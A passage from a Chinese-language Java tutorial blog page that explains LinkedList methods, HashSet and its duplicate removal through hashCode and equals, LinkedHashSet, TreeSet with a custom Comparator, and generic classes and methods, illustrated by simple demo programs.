:底层数据结构是可变长数组，特点就是查询和修改效率高，插入和删除效率低</li><li>LinkedList：底层数据结构是链表，特点是查询和修改效率低，但是插入和删除效率高</li></ul><blockquote><p>未来的实际应用中，如果增删多，使用LinekdList，如果改查多，使用ArrayList</p></blockquote><p><a name="15f32f9f"></a></p><h4 id="3-5-1-LinkedList特有方法"><a href="#3-5-1-LinkedList特有方法" class="headerlink" title="3.5.1 - LinkedList特有方法"></a>3.5.1 - LinkedList特有方法</h4><table><thead><tr><th>方法名</th><th>说明</th></tr></thead><tbody><tr><td><code>public void addFirst(E e)</code></td><td>在头结点添加成员</td></tr><tr><td><code>public void addLast(E e)</code></td><td>在尾结点添加成员</td></tr><tr><td><code>public E getFirst()</code></td><td>获取头结点</td></tr><tr><td><code>public E getLast()</code></td><td>获取尾结点</td></tr><tr><td><code>public E removeFirst()</code></td><td>删除头结点</td></tr><tr><td><code>public E removeLast()</code></td><td>删除尾结点</td></tr></tbody></table><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.LinkedList;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  LinkedList特有方法</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo02</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        LinkedList&lt;String&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedList</span>&lt;&gt;();<span class="hljs-comment">//创建链表集合</span><br><br>        list.add(<span class="hljs-string">&quot;111&quot;</span>);<br>        list.add(<span class="hljs-string">&quot;222&quot;</span>);<br>        list.add(<span class="hljs-string">&quot;333&quot;</span>);<br>        list.add(<span class="hljs-string">&quot;444&quot;</span>);<br><br>        System.out.println(<span class="hljs-string">&quot;操作之前：&quot;</span> + list);<br><br>        <span class="hljs-comment">//添加头尾结点成员</span><br>        list.addFirst(<span class="hljs-string">&quot;AAA&quot;</span>);<br>        list.addLast(<span class="hljs-string">&quot;ZZZ&quot;</span>);<br><br>        <span class="hljs-comment">//获取头尾结点</span><br>        System.out.println(list.getFirst());<br>        System.out.println(list.getLast());<br><br>        <span class="hljs-comment">//删除头尾结点</span><br>        System.out.println(list.removeFirst());<br>        System.out.println(list.removeLast());<br><br>        System.out.println(<span class="hljs-string">&quot;操作之后：&quot;</span> + list);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="d4f4ecae"></a></p><h2 id="4-Set"><a href="#4-Set" class="headerlink" title="4 - Set"></a>4 - Set</h2><p><a name="7a1efdfa"></a></p><h3 id="4-1-概述"><a href="#4-1-概述" class="headerlink" title="4.1 - 概述"></a>4.1 - 概述</h3><ul><li>Set是一个接口，继承于Collection，与List类似，都需要通过实现类对其进行操作</li><li>特点 <ul><li>不允许包含重复的值</li><li>没有索引，所以不能使用普通的for循环进行遍历</li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.HashSet;<br><span class="hljs-keyword">import</span> java.util.Set;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  Set集合基本应用</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo03</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//父类的引用指向子类对象，形成多态</span><br>        Set&lt;String&gt; set = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;();<br><br>        set.add(<span class="hljs-string">&quot;黄固&quot;</span>);<br>        set.add(<span class="hljs-string">&quot;欧阳锋&quot;</span>);<br>        set.add(<span class="hljs-string">&quot;段智兴&quot;</span>);<br>        set.add(<span class="hljs-string">&quot;洪七公&quot;</span>);<br><br>        set.add(<span class="hljs-string">&quot;段智兴&quot;</span>);<br><br>        System.out.println(set);<span class="hljs-comment">//打印集合</span><br>        <span class="hljs-comment">//HashSet集合对于数据的读写顺序不做保证</span><br>        <span class="hljs-comment">//相同的元素，多次存储，只能被保留一个，而且不报错</span><br>        <span class="hljs-comment">//List集合可以存储重复的值，但是Set集合不可以</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="cf7c4f20"></a></p><h3 id="4-2-哈希值"><a href="#4-2-哈希值" class="headerlink" title="4.2 - 哈希值"></a>4.2 - 哈希值</h3><blockquote><p>哈希值就是JDK根据对象的地址或者字符串或者数值通过自己内部的算法计算出来的一个整数类型数据<br><code>public int hashCode()</code>  用来获取哈希值，来自于Object顶层类</p></blockquote><ul><li>对象的哈希值的特点 <ul><li>同一个对象多次调用<code>hashCode()</code>方法，得到的返回值是相同的</li><li>默认情况下，不同的对象哈希码值也是不同的（特殊情况）</li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  对象的哈希值特点</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo04</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//对象相同，哈希码值相同</span><br>        System.out.println(<span class="hljs-string">&quot;Andy&quot;</span>.hashCode());<br>        System.out.println(<span class="hljs-string">&quot;Andy&quot;</span>.hashCode());<br><br>        <span class="hljs-comment">//对象不同，哈希码值不同，但是特殊情况除外</span><br>        System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>().hashCode());<br>        System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>().hashCode());<br><br>        <span class="hljs-comment">//对象不同，但是哈希码值也有可能会相同，如果单单只凭借哈希码值判断对象是否相同，是不严谨的。</span><br>        System.out.println(<span class="hljs-string">&quot;迯鄒&quot;</span>.hashCode());<br>        System.out.println(<span class="hljs-string">&quot;述郳&quot;</span>.hashCode());<br>        System.out.println(<span class="hljs-string">&quot;迱郔&quot;</span>.hashCode());<br>        System.out.println(<span class="hljs-string">&quot;迲邵&quot;</span>.hashCode());<br>        System.out.println(<span class="hljs-string">&quot;迳邖&quot;</span>.hashCode());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="b7098ee3"></a></p><h3 id="4-3-HashSet的去重原理"><a href="#4-3-HashSet的去重原理" class="headerlink" title="4.3 - HashSet的去重原理"></a>4.3 - HashSet的去重原理</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Objects;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Student&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">equals</span><span class="hljs-params">(Object o)</span> &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span> == o) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">if</span> (o == <span class="hljs-literal">null</span> || getClass() != o.getClass()) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        <span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> (Student) o;<br>        <span class="hljs-keyword">return</span> age == student.age &amp;&amp;<br>                Objects.equals(name, student.name);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> Objects.hash(name, age);<br>    &#125;<br>&#125;<br>------------------------------------------------<br><span class="hljs-keyword">import</span> java.util.HashSet;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  HashSet去重原理</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo05</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//创建HashSet集合</span><br>        HashSet&lt;Student&gt; set = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;();<br><br>        set.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">&quot;黄固&quot;</span>,<span class="hljs-number">35</span>));<br>        set.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">&quot;欧阳锋&quot;</span>,<span class="hljs-number">28</span>));<br>        set.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">&quot;段智兴&quot;</span>,<span class="hljs-number">37</span>));<br>        set.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">&quot;洪七公&quot;</span>,<span class="hljs-number">29</span>));<br>        set.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">&quot;段智兴&quot;</span>,<span class="hljs-number">37</span>));<span class="hljs-comment">//   ?</span><br><br>        <span class="hljs-comment">//从程序底层角度出发，两个段智兴不是同一个对象，都有自己的存储空间，所以哈希码值不同</span><br>        <span class="hljs-comment">//在学生实体类内部重写equals和hashCode方法，就可以实现对象的去重操作</span><br>        <span class="hljs-keyword">for</span> (Student stu : set) &#123;<br>            System.out.println(stu);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><strong>去重原理：</strong> <ul><li>先对比hashCode方法，如果哈希值相同，再去比较equals的内容，这两个方法经常需要在自定义类中进行重写，帮助我们解决逻辑上的去重关系</li></ul></li><li><strong>HashSet集合的特点</strong> <ul><li>底层数据结构是“哈希表”</li><li>集合对于读写顺序不做保证</li><li>没有索引</li><li>Set集合中的内容不能重复<br>  <a name="840244f3"></a></li></ul></li></ul><h3 id="4-4-哈希表"><a href="#4-4-哈希表" class="headerlink" title="4.4 - 哈希表"></a>4.4 - 哈希表</h3><blockquote><p>通过  数组  +  链表  实现的一种数结构<br>哈希表的构造方法参数是一个长度为16个元素的数组，通过（对象的哈希值 % 16）的值，作为头结点在数组中选择相对应的位置。</p></blockquote><p><a name="7247e547"></a></p><h3 id="4-5-LinkedHashSet"><a href="#4-5-LinkedHashSet" class="headerlink" title="4.5 - LinkedHashSet"></a>4.5 - LinkedHashSet</h3><ul><li>特点 <ul><li>LinkedHashSet是哈希表和链表实现的set接口，具有可预测的读写顺序</li><li>由链表来保证元素的有序</li><li>由哈希表来保证元素的唯一性</li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.LinkedHashSet;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  LinkedHashSet集合</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo06</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        LinkedHashSet&lt;String&gt; set = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedHashSet</span>&lt;&gt;();<br><br>        set.add(<span class="hljs-string">&quot;黄固&quot;</span>);<br>        set.add(<span class="hljs-string">&quot;欧阳锋&quot;</span>);<br>        set.add(<span class="hljs-string">&quot;段智兴&quot;</span>);<br>        set.add(<span class="hljs-string">&quot;洪七公&quot;</span>);<br><br>        set.add(<span class="hljs-string">&quot;段智兴&quot;</span>);<br><br>        System.out.println(set);<br>        <span class="hljs-comment">//因为数据结构越复杂程序效率越低</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="a1ab6739"></a></p><h3 id="4-6-TreeSet"><a href="#4-6-TreeSet" class="headerlink" title="4.6 - TreeSet"></a>4.6 - TreeSet</h3><ul><li>特点 <ul><li>有序元素的存储集合，这里的顺序指的是逻辑顺序 <ul><li><code>TreeSet()</code>：自然规则排序，默认规则</li><li><code>TreeSet(Comparator com)</code>：自定义规则排序</li></ul></li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Comparator;<br><span class="hljs-keyword">import</span> java.util.TreeSet;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  TreeSet</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo07</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-comment">//        TreeSet&lt;Integer&gt; set = new TreeSet&lt;&gt;();//默认排序规则，升序排序</span><br>        TreeSet&lt;Integer&gt; set = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeSet</span>&lt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Comparator</span>&lt;Integer&gt;() &#123;<br>            <span class="hljs-meta">@Override</span>  <span class="hljs-comment">//compare方法的返回值决定了排序规则</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compare</span><span class="hljs-params">(Integer o1, Integer o2)</span> &#123;<br><span class="hljs-comment">//                return 0; //等于0  表示后面插入的元素与当前元素相等</span><br><span class="hljs-comment">//                return 9527;//大于0  表示后面插入的元素比当前元素大</span><br><span class="hljs-comment">//                return -1314; //小于0  表示后面插入的元素比当前元素小</span><br><span class="hljs-comment">//                return o1 - o2;//代表升序排序，默认规则</span><br>                <span class="hljs-keyword">return</span> o2 - o1; <span class="hljs-comment">//代表降序排序</span><br>            &#125;<br>        &#125;);<br><br>        set.add(<span class="hljs-number">66</span>);<br>        set.add(<span class="hljs-number">22</span>);<br>        set.add(<span class="hljs-number">33</span>);<br>        set.add(<span class="hljs-number">11</span>);<br>        set.add(<span class="hljs-number">55</span>);<br>        set.add(<span class="hljs-number">44</span>);<br><br>        System.out.println(set);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>自定义排序，存储自定义对象<br>  <a name="5a5cf0cb"></a></li></ul><h2 id="5-泛型"><a href="#5-泛型" class="headerlink" title="5 - 泛型"></a>5 - 泛型</h2><blockquote><p>编译时的类型安全检测机制，也可以把这个数据类型理解成是一种可以传递的参数<br>泛型类、泛型方法、泛型接口</p></blockquote><p><a name="a6e1c439"></a></p><h3 id="5-1-泛型的定义格式"><a href="#5-1-泛型的定义格式" class="headerlink" title="5.1 - 泛型的定义格式"></a>5.1 - 泛型的定义格式</h3><ul><li>&lt;类型&gt; ： 表示只是一种类型的格式</li><li>&lt;类型1，类型2，类型3…&gt;:表示的是多种类型的格式，用逗号分割<br>  <a name="63f313af"></a></li></ul><h3 id="5-2-泛型类"><a href="#5-2-泛型类" class="headerlink" title="5.2 - 泛型类"></a>5.2 - 泛型类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> demo02;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  泛型类</span><br><span class="hljs-comment"> * E - Element</span><br><span class="hljs-comment"> * K - Key</span><br><span class="hljs-comment"> * T - Type</span><br><span class="hljs-comment"> * V - Value</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Generic</span>&lt;T&gt; &#123;<br>    <span class="hljs-keyword">private</span> T t;<br><br>    <span class="hljs-keyword">public</span> T <span class="hljs-title function_">getT</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> t;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setT</span><span class="hljs-params">(T t)</span> &#123;<br>        <span class="hljs-built_in">this</span>.t = t;<br>    &#125;<br>&#125;<br>-------------------------------<br><span class="hljs-keyword">package</span> demo02;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  泛型类的测试类</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo02</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        Generic&lt;String&gt; strG = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Generic</span>&lt;&gt;();<br>        strG.setT(<span class="hljs-string">&quot;我是一个字符串&quot;</span>);<br>        System.out.println(strG.getT());<br><br>        Generic&lt;Integer&gt; intG = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Generic</span>&lt;&gt;();<br>        intG.setT(<span class="hljs-number">9527</span>);<br>        System.out.println(intG.getT());<br><br>        Generic&lt;Student&gt; stuG = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Generic</span>&lt;&gt;();<br>        stuG.setT(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">&quot;Andy&quot;</span>,<span class="hljs-number">18</span>));<br>        System.out.println(stuG.getT());<br><br>        <span class="hljs-comment">//泛型就会以参数的方式传递到泛型类中</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="f608438b"></a></p><h3 id="5-3-泛型方法"><a href="#5-3-泛型方法" class="headerlink" title="5.3 - 泛型方法"></a>5.3 - 泛型方法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> demo03;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  泛型方法</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Generic</span> &#123;<br>    <span class="hljs-comment">//定义泛型方法</span><br>    <span class="hljs-keyword">public</span> &lt;T&gt; <span class="hljs-keyword">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">(T i)</span> &#123;<br>        System.out.println(i);<br>    &#125;<br><br>    <span class="hljs-comment">/*public void show(String string) &#123;</span><br><span class="hljs-comment">        System.out.println(string);</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    public void show(float v) &#123;</span><br><span class="hljs-comment">        System.out.println(v);</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    public void show(double v) &#123;</span><br><span class="hljs-comment">        System.out.println(v);</span><br><span class="hljs-comment">    &#125;*/</span><br>&#125;<br>-----------------------------------------------------<br><span class="hljs-keyword">package</span> demo03;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  泛型方法测试类</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo03</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span 